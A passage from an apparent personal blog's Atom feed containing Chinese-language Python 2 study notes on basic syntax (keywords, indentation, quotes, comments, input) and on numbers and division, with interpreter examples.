align="center">finally</td><td align="center">or</td></tr><tr><td align="center">break</td><td align="center">for</td><td align="center">pass</td></tr><tr><td align="center">class</td><td align="center">from</td><td align="center">print</td></tr><tr><td align="center">continue</td><td align="center">global</td><td align="center">raise</td></tr><tr><td align="center">def</td><td align="center">if</td><td align="center">return</td></tr><tr><td align="center">del</td><td align="center">import</td><td align="center">try</td></tr><tr><td align="center">elif</td><td align="center">in</td><td align="center">while</td></tr><tr><td align="center">else</td><td align="center">is</td><td align="center">with</td></tr><tr><td align="center">except</td><td align="center">lambda</td><td align="center">yield</td></tr></tbody></table><span id="more"></span><h2 id="四、行和缩进"><a href="#四、行和缩进" class="headerlink" title="四、行和缩进"></a>四、行和缩进</h2><blockquote><p>学习Python与其他语言最大的区别就是，Python的代码块不使用大括号（{}）来控制类，函数以及其他逻辑判断。python最具特色的就是用缩进来写模块。<br>缩进的空白数量是可变的，但是所有代码块语句必须包含相同的缩进空白数量，这个必须严格执行。<br>IndentationError: unexpected indent 错误是python编译器是在告诉你”Hi，老兄，你的文件里格式不对了，可能是tab和空格没对齐的问题”，所有python对格式要求非常严格。<br>如果是 IndentationError: unindent does not match any outer indentation level错误表明，你使用的缩进方式不一致，有的是 tab 键缩进，有的是空格缩进，改为一致即可。</p></blockquote><p><strong>个人建议</strong>：因为不同的系统、不同的IDE tab缩进设置长度不一，建议使用空格代替tab缩进，能省去一些不必要的麻烦。</p><h2 id="五、多行语句"><a href="#五、多行语句" class="headerlink" title="五、多行语句"></a>五、多行语句</h2><p>语句中包含[], {} 或 () 括号就不需要使用多行连接符。如：python列表、元组、字典定义。<br>而对于语句非如上三类情况，可以在换行处使用斜杆( *<em>*</em> )，达到换行目的。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#coding=utf8</span><br><span class="line"></span><br><span class="line">count = 0</span><br><span class="line">count = count + 1 \</span><br><span class="line">    + 3 + 5;</span><br><span class="line"></span><br><span class="line">print &#x27;总计：&#x27;, count;</span><br></pre></td></tr></table></figure><p>如果行尾未使用斜杆的话，可能会报非法缩进异常：<code>IndentationError: unexpected indent</code>。</p><h2 id="五、python引号"><a href="#五、python引号" class="headerlink" title="五、python引号"></a>五、python引号</h2><p>python里的引号有三种形式：单引号(‘)，双引号(“)以及三引号(‘’’ 或 “””)。<br>其中，单引号和双引号都用于定义一个字符串变量，而三引号可以用来定义一个段落(包含换行)变量。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">paragraph = <span class="string">&quot;&quot;&quot;这是一个段落。</span></span><br><span class="line"><span class="string">包含了多个语句&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> paragraph</span><br></pre></td></tr></table></figure><p>另外，由于在python里字符串可以单独存在，而不赋值给任何变量。这种形式字符串可以被当作注释使用。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Apr 27, 2016</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: yeshaoting</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="六、python注释"><a href="#六、python注释" class="headerlink" title="六、python注释"></a>六、python注释</h2><p>单行注释：<code>#</code><br>多行注释：使用三引号。参见：python引号</p><h2 id="七、接收用户输入"><a href="#七、接收用户输入" class="headerlink" title="七、接收用户输入"></a>七、接收用户输入</h2><p>内建函数：raw_input，用于接收终端用户输入，返回一个字符串。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value=raw_input(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;user input value:&quot;</span>, value</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;user input value type:&quot;</span>, <span class="built_in">type</span>(value)</span><br></pre></td></tr></table></figure><p>执行实例为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span>:<span class="number">1</span></span><br><span class="line">user <span class="built_in">input</span> value: <span class="number">1</span></span><br><span class="line">user <span class="built_in">input</span> value <span class="built_in">type</span>: &lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>:a b ef</span><br><span class="line">user <span class="built_in">input</span> value: a b ef</span><br><span class="line">user <span class="built_in">input</span> value <span class="built_in">type</span>: &lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="八、多个语句构成代码块"><a href="#八、多个语句构成代码块" class="headerlink" title="八、多个语句构成代码块"></a>八、多个语句构成代码块</h2><p>像if、while、def和class这样的复合语句，代码块首行以关键字开始，需要以冒号(:)结束。<br>后面的子句使用相同的缩进用以表示同属一个代码块。</p><p>一个代码块结束后建议添加一个空白行使用代码块间界线分明，容易分辨。</p><h2 id="九、附录"><a href="#九、附录" class="headerlink" title="九、附录"></a>九、附录</h2><p>参考文档：<a href="http://www.runoob.com/python/python-basic-syntax.html">Python基础语法</a><br>扩展阅读：<a href="http://www.runoob.com/python/python-command-line-arguments.html">Python 命令行参数</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/python.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、第一个Python程序&quot;&gt;&lt;a href=&quot;#一、第一个Python程序&quot; class=&quot;headerlink&quot; title=&quot;一、第一个Python程序&quot;&gt;&lt;/a&gt;一、第一个Python程序&lt;/h2&gt;&lt;h3 id=&quot;1-交互式编程&quot;&gt;&lt;a href=&quot;#1-交互式编程&quot; class=&quot;headerlink&quot; title=&quot;1. 交互式编程&quot;&gt;&lt;/a&gt;1. 交互式编程&lt;/h3&gt;&lt;p&gt;在mac或者linux终端输入python命令即可进入交互式编程。如：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yerba-buena:pystudy yeshaoting$ python&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Python &lt;span class=&quot;number&quot;&gt;2.7&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.10&lt;/span&gt; (default, Jul &lt;span class=&quot;number&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2015&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;19&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;46&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;27&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[GCC &lt;span class=&quot;number&quot;&gt;4.2&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1&lt;/span&gt; Compatible Apple LLVM &lt;span class=&quot;number&quot;&gt;6.0&lt;/span&gt; (clang-&lt;span class=&quot;number&quot;&gt;600.0&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.39&lt;/span&gt;)] on darwin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;type&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;help&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;copyright&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;credits&amp;quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;license&amp;quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; more information.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;2-脚本式编程&quot;&gt;&lt;a href=&quot;#2-脚本式编程&quot; class=&quot;headerlink&quot; title=&quot;2. 脚本式编程&quot;&gt;&lt;/a&gt;2. 脚本式编程&lt;/h3&gt;&lt;p&gt;将python代码写入一个以.py为扩展名的python文件，如：test.py。&lt;br&gt;脚本写完后，可以通过如下二种方式执行python脚本：python test.py。&lt;/p&gt;
&lt;p&gt;若python文件里设置了python shebang，则可以通过./test.py来执行。&lt;/p&gt;
&lt;h2 id=&quot;二、python标识符&quot;&gt;&lt;a href=&quot;#二、python标识符&quot; class=&quot;headerlink&quot; title=&quot;二、python标识符&quot;&gt;&lt;/a&gt;二、python标识符&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;在python里，标识符有字母、数字、下划线组成。所有标识符可以包括英文、数字以及下划线（_），但不能以数字开头。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;python中的标识符是区分大小写的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;以下划线开头的标识符是有特殊意义的。&lt;br&gt;以单下划线开头（_foo）的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用“from xxx import *”而导入；&lt;br&gt;以双下划线开头的（__foo）代表类的私有成员；&lt;br&gt;以双下划线开头和结尾的（__foo__）代表python里特殊方法专用的标识，如__init__()代表类的构造函数。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;三、Python保留字符&quot;&gt;&lt;a href=&quot;#三、Python保留字符&quot; class=&quot;headerlink&quot; title=&quot;三、Python保留字符&quot;&gt;&lt;/a&gt;三、Python保留字符&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;and&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;exec&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;not&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;assert&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;finally&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;or&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;break&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;for&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;pass&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;class&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;from&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;print&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;continue&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;global&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;raise&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;def&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;if&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;return&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;del&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;import&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;try&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;elif&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;in&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;while&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;else&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;is&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;with&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;except&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;lambda&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;yield&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;</summary>
    
    
    
    <category term="系统脚本" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="python" scheme="http://yeshaoting.cn/tags/python/"/>
    
    <category term="学习笔记" scheme="http://yeshaoting.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>《跟老齐学Python》学习笔记-数</title>
    <link href="http://yeshaoting.cn/article/python/%E3%80%8A%E8%B7%9F%E8%80%81%E9%BD%90%E5%AD%A6Python%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%95%B0/"/>
    <id>http://yeshaoting.cn/article/python/%E3%80%8A%E8%B7%9F%E8%80%81%E9%BD%90%E5%AD%A6Python%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%95%B0/</id>
    <published>2016-05-01T14:34:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/python.png" class="img-logo img-center" /><p><strong>注</strong>：所有示例基于python2。<br><strong>注</strong>：由于老齐的教程面向零基础，简单通俗适用于编程新手；其篇幅又过长，很不适合已经熟知其他编程语言的人员使用，后期打算换用其他的教程进行学习。</p><h2 id="一、数和四则运算"><a href="#一、数和四则运算" class="headerlink" title="一、数和四则运算"></a>一、数和四则运算</h2><h3 id="1-查看对象内存地址：id"><a href="#1-查看对象内存地址：id" class="headerlink" title="1. 查看对象内存地址：id()"></a>1. 查看对象内存地址：id()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(<span class="number">8</span>)</span><br><span class="line"><span class="number">140200127779760</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(<span class="number">23.56</span>)</span><br><span class="line"><span class="number">140200127787712</span></span><br></pre></td></tr></table></figure><h3 id="2-查看对象类型：type"><a href="#2-查看对象类型：type" class="headerlink" title="2. 查看对象类型：type()"></a>2. 查看对象类型：type()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="number">2</span>)</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="number">3.4</span>)</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="number">23333333333333333333</span>)</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="string">&#x27;yeshaoting&#x27;</span>)</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="3-对象有类型，变量无类型"><a href="#3-对象有类型，变量无类型" class="headerlink" title="3. 对象有类型，变量无类型"></a>3. 对象有类型，变量无类型</h3><p>python中变量仅仅只一个标识，指向某个存储空间。<br>程序执行赛程中其类型可以任意修改。<br>相对于java强类型言语而言，python是弱类型的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="number">2</span>; <span class="built_in">type</span>(a); a=<span class="number">3.4</span>; <span class="built_in">type</span>(a);</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="4-浮点数与整数运算结果是浮点数。"><a href="#4-浮点数与整数运算结果是浮点数。" class="headerlink" title="4. 浮点数与整数运算结果是浮点数。"></a>4. 浮点数与整数运算结果是浮点数。</h3><h3 id="5-运算溢出问题"><a href="#5-运算溢出问题" class="headerlink" title="5. 运算溢出问题"></a>5. 运算溢出问题</h3><p>整数间运算不会出现整数溢出问题，但是如果与浮点数一起计算就有可能出现溢出问题。</p><p>参见：<a href="https://github.com/yeshaoting/StarterLearningPython/blob/master/102.md">https://github.com/yeshaoting/StarterLearningPython/blob/master/102.md</a></p><span id="more"></span><h2 id="二、除法"><a href="#二、除法" class="headerlink" title="二、除法"></a>二、除法</h2><h3 id="1-整型相除"><a href="#1-整型相除" class="headerlink" title="1. 整型相除"></a>1. 整型相除</h3><p>整型相除结果是商(结果不会四舍五入)，不会出现小数。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">4</span>/<span class="number">5</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="2-浮点数运算结果是浮点数，不会出现四舍五入的情况。"><a href="#2-浮点数运算结果是浮点数，不会出现四舍五入的情况。" class="headerlink" title="2. 浮点数运算结果是浮点数，不会出现四舍五入的情况。"></a>2. 浮点数运算结果是浮点数，不会出现四舍五入的情况。</h3><h3 id="3-引用division模块解决除法问题"><a href="#3-引用division模块解决除法问题" class="headerlink" title="3. 引用division模块解决除法问题"></a>3. 引用division模块解决除法问题</h3><p>division模块重新定义了除法的一些特性，如：整数相除得到的结果是一个浮点数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">3</span>/<span class="number">4</span></span><br><span class="line"><span class="number">0.75</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span>/<span class="number">3</span></span><br><span class="line"><span class="number">0.6666666666666666</span></span><br></pre></td></tr></table></figure><h3 id="4-取余"><a href="#4-取余" class="headerlink" title="4. 取余"></a>4. 取余</h3><p>取余数可使用<code>%</code>，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;&gt; <span class="number">4</span>%<span class="number">5</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><h3 id="4-内建函数divmod"><a href="#4-内建函数divmod" class="headerlink" title="4. 内建函数divmod"></a>4. 内建函数divmod</h3><p>python提供的内建函数divmod也能为除法运算一次性返回商和余数。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">divmod</span>(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">divmod</span>(<span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">divmod</span>(<span class="number">3</span>, <span class="number">2</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="5-四舍五入"><a href="#5-四舍五入" class="headerlink" title="5. 四舍五入"></a>5. 四舍五入</h3><p>内建函数round() 方法返回浮点数x的四舍五入值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">round</span>(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">2.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">round</span>(<span class="number">2</span>/<span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line"><span class="number">0.7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">round</span>(<span class="number">2</span>/<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line"><span class="number">1.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">round</span>(<span class="number">2</span>/<span class="number">4</span>, <span class="number">0</span>)</span><br><span class="line"><span class="number">1.0</span></span><br></pre></td></tr></table></figure><p>参见：<a href="https://github.com/yeshaoting/StarterLearningPython/blob/master/103.md">https://github.com/yeshaoting/StarterLearningPython/blob/master/103.md</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/python.png&quot; class=&quot;img-logo img-center&quot; /&gt;

&lt;p&gt;&lt;strong&gt;注&lt;/strong&gt;：所有示例基于python2。&lt;br&gt;&lt;strong&gt;注&lt;/strong&gt;：由于老齐的教程面向零基础，简单通俗适用于编程新手；其篇幅又过长，很不适合已经熟知其他编程语言的人员使用，后期打算换用其他的教程进行学习。&lt;/p&gt;
&lt;h2 id=&quot;一、数和四则运算&quot;&gt;&lt;a href=&quot;#一、数和四则运算&quot; class=&quot;headerlink&quot; title=&quot;一、数和四则运算&quot;&gt;&lt;/a&gt;一、数和四则运算&lt;/h2&gt;&lt;h3 id=&quot;1-查看对象内存地址：id&quot;&gt;&lt;a href=&quot;#1-查看对象内存地址：id&quot; class=&quot;headerlink&quot; title=&quot;1. 查看对象内存地址：id()&quot;&gt;&lt;/a&gt;1. 查看对象内存地址：id()&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;built_in&quot;&gt;id&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;140200127779760&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;built_in&quot;&gt;id&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;23.56&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;140200127787712&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;2-查看对象类型：type&quot;&gt;&lt;a href=&quot;#2-查看对象类型：type&quot; class=&quot;headerlink&quot; title=&quot;2. 查看对象类型：type()&quot;&gt;&lt;/a&gt;2. 查看对象类型：type()&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;int&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;3.4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;float&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;23333333333333333333&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;long&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;yeshaoting&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;3-对象有类型，变量无类型&quot;&gt;&lt;a href=&quot;#3-对象有类型，变量无类型&quot; class=&quot;headerlink&quot; title=&quot;3. 对象有类型，变量无类型&quot;&gt;&lt;/a&gt;3. 对象有类型，变量无类型&lt;/h3&gt;&lt;p&gt;python中变量仅仅只一个标识，指向某个存储空间。&lt;br&gt;程序执行赛程中其类型可以任意修改。&lt;br&gt;相对于java强类型言语而言，python是弱类型的。&lt;/p&gt;
